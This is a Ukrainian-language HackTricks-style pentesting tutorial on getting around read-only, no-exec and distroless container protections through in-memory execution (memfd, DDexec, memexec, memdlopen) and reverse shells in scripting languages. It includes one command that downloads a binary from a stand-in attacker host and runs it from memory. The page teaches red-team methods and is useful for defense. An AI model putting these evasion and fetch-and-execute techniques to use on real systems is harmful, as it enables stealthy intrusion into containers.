# Обхід захистів FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Відео

У наведених нижче відео детальніше пояснюються техніки, згадані на цій сторінці:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## Сценарій read-only / no-exec

Дедалі частіше трапляються Linux-машини, змонтовані із захистом файлової системи **read-only (ro)**, особливо в контейнерах. Це пояснюється тим, що запустити контейнер із файловою системою ro так само просто, як встановити **`readOnlyRootFilesystem: true`** у `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Однак навіть якщо файлову систему змонтовано як ro, **`/dev/shm`** усе одно буде доступним для запису, тож твердження, що ми не можемо нічого записати на диск, є хибним. Проте цю папку буде **змонтовано із захистом no-exec**, тому якщо ви завантажите сюди binary, **ви не зможете його виконати**.

> [!WARNING]
> З точки зору red team це **ускладнює завантаження та виконання** binary, яких ще немає в системі (наприклад, backdoor або enumerator на кшталт `kubectl`).

## Найпростіший обхід: Scripts

Зверніть увагу, що я згадував саме binary: ви можете **виконати будь-який script**, якщо interpreter присутній на машині, наприклад **shell script**, якщо доступний `sh`, або **python** **script**, якщо встановлено `python`.

Однак цього недостатньо для виконання вашого binary backdoor або інших binary tools, які можуть знадобитися.

## Обхід через Memory

Якщо ви хочете виконати binary, але файлова система цього не дозволяє, найкращий спосіб — **виконати його з memory**, оскільки **ці захисти там не застосовуються**.

### Обхід через FD + exec syscall

Якщо на машині доступні потужні scripting engines, такі як **Python**, **Perl** або **Ruby**, ви можете завантажити binary для виконання з memory, зберегти його у memory file descriptor (`create_memfd` syscall), який не буде захищений цими механізмами, а потім викликати **`exec` syscall**, вказавши **fd як файл для виконання**.

Для цього можна скористатися project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви передаєте йому binary, і він згенерує script в указаній мові, де **binary стиснуто та закодовано в b64**, а також містяться інструкції для його **декодування та розпакування** у **fd**, створений викликом `create_memfd` syscall, і виклик **exec** syscall для його запуску.

> [!WARNING]
> Це не працює в інших scripting languages, таких як PHP або Node, оскільки вони не мають **стандартного способу викликати raw syscalls** зі script, тому неможливо викликати `create_memfd` для створення **memory fd**, у якому зберігатиметься binary.
>
> Крім того, створення **звичайного fd** із файлом у `/dev/shm` не спрацює, оскільки ви не зможете його запустити через застосування **захисту no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) — це техніка, яка дає змогу **змінювати memory власного процесу**, перезаписуючи його **`/proc/self/mem`**.

Таким чином, **контролюючи assembly code**, який виконує процес, ви можете записати **shellcode** і «мутувати» процес, щоб він **виконав будь-який довільний code**.

> [!TIP]
> **DDexec / EverythingExec** дає змогу завантажувати та **виконувати** власний **shellcode** або **будь-який binary** з **memory**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Щоб отримати більше інформації про цю техніку, перегляньте Github або:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) — це природний наступний крок після DDexec. Це **DDexec shellcode, запущений як daemon**, тому щоразу, коли потрібно **запустити інший binary**, не потрібно повторно запускати DDexec: достатньо запустити memexec shellcode за допомогою техніки DDexec, а потім **взаємодіяти з цим daemon, щоб передавати нові binaries для завантаження та запуску**.

Приклад використання **memexec для виконання binaries з PHP reverse shell** можна знайти тут: [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Як і DDexec, техніка [**memdlopen**](https://github.com/arget13/memdlopen) забезпечує **простіший спосіб завантаження binaries** у пам'ять для подальшого виконання. Вона також може дозволити завантажувати binaries із dependencies.

## Distroless Bypass

Для спеціального пояснення **того, чим насправді є distroless**, коли він допомагає, коли ні та як він змінює підходи до post-exploitation у containers, перегляньте:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless containers містять лише **мінімальний набір компонентів, необхідних для запуску конкретного application або service**, наприклад libraries і runtime dependencies, але не містять більших компонентів, таких як package manager, shell або system utilities.

Мета distroless containers — **зменшити attack surface containers шляхом усунення непотрібних компонентів** і мінімізації кількості vulnerabilities, які можна exploit.

### Reverse Shell

У distroless container ви можете **не знайти навіть `sh` або `bash`**, щоб отримати звичайний shell. Також ви не знайдете такі binaries, як `ls`, `whoami`, `id`... тобто все, що зазвичай використовується в system.

> [!WARNING]
> Тому ви **не зможете отримати reverse shell** або **enumerate** system так, як ви зазвичай це робите.

Однак якщо compromised container, наприклад, запускає flask web application, то Python встановлений, і ви можете отримати **Python reverse shell**. Якщо він запускає node, можна отримати Node rev shell; те саме стосується майже будь-якої **scripting language**.

> [!TIP]
> Використовуючи scripting language, можна **enumerate system** за допомогою можливостей цієї мови.

Якщо **`read-only/no-exec`** protections відсутні, можна використати свій reverse shell, щоб **записати binaries у file system** і **виконати** їх.

> [!TIP]
> Однак у таких containers ці protections зазвичай існують, але для їх обходу можна використати **попередні memory execution techniques**.

Приклади того, як **exploit деякі RCE vulnerabilities**, щоб отримати **reverse shells** через scripting languages і виконувати binaries з memory, можна знайти в [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## References

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
